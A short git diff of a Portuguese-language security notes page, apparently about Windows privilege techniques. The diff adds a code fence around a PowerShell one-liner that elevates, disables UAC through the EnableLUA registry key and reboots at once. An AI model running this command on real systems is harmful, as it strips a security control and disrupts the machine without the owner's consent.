@@ -205,6 +205,7 @@ python3 decode_users_pass.py
 
 **Atenção:** Esta técnica requer interação do usuário (pop-up UAC) e reinicialização do sistema.
 
+```cmd
 # Desabilita o UAC e reinicia o sistema imediatamente:
 powershell -Command "Start-Process cmd -ArgumentList '/c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f && shutdown /r /t 0' -Verb RunAs"
 ---
